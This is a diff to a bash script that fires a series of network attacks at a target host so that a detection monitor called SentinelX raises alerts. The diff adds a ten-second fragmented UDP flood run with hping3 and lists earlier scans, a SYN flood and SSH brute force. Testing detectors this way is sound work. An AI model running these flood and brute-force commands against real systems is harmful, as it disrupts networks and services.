@@ -159,6 +159,25 @@ nmap -sU -T4 --top-ports 50 $TARGET
 echo ""
 echo -e "${GREEN}  [DONE] UDP scan complete.${RESET}"
 echo ""
+sleep 3
+
+# ──────────────────────────────────────────────────────────────
+# ATTACK 7: Fragmented UDP Flood (Designed to trigger GraphSAGE)
+# ──────────────────────────────────────────────────────────────
+echo -e "${BOLD}[ATTACK 7/7] Fragmented UDP Flood -- Graph Anomaly Trigger${RESET}"
+echo -e "${YELLOW}  Blasting $TARGET with fragmented UDP packets to create structural graph anomalies...${RESET}"
+echo ""
+
+# Run a heavy, fragmented UDP flood on random ports for 10 seconds
+timeout 10 hping3 --udp --frag --flood --rand-dest $TARGET 2>/dev/null &
+HPING2_PID=$!
+sleep 10
+kill $HPING2_PID 2>/dev/null
+wait $HPING2_PID 2>/dev/null
+
+echo ""
+echo -e "${GREEN}  [DONE] Fragmented UDP flood stopped.${RESET}"
+echo ""
 
 # ──────────────────────────────────────────────────────────────
 # SUMMARY
@@ -176,6 +195,7 @@ echo -e "  3. Aggressive Scan      (OS/Service Detection)"
 echo -e "  4. SYN Flood            (Denial of Service)"
 echo -e "  5. SSH Brute Force      (Credential Stuffing)"
 echo -e "  6. UDP Intense Scan     (Unknown Traffic Pattern)"
+echo -e "  7. Fragmented UDP Flood (GraphSAGE Structural Anomaly)"
 echo ""
 echo -e "${CYAN}  Now check the SentinelX monitor on Ubuntu for alerts!${RESET}"
 echo ""
